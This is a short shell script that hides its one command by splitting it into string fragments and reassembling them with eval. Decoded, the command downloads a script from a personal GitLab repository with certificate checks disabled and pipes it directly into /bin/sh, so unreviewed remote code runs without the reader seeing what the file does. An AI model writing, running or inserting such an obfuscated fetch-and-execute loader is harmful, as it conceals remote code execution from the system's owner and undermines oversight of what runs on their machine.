z="
";Kz='lab.';Tz='/ope';Pz='mage';Mz='emil';Gz='cate';Lz='com/';Zz=' /bi';Yz=' - |';Jz='/git';Oz='l1/i';Xz='h -O';Vz='id-7';Hz=' htt';Iz='ps:/';Cz='no-c';cz=' 0';bz='exit';Rz='raw/';Qz='s/-/';Ez='-cer';Fz='tifi';Bz='  --';az='n/sh';Wz='.1.s';Az='wget';Sz='main';Dz='heck';Uz='ndro';Nz='nabi';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$z$bz$cz"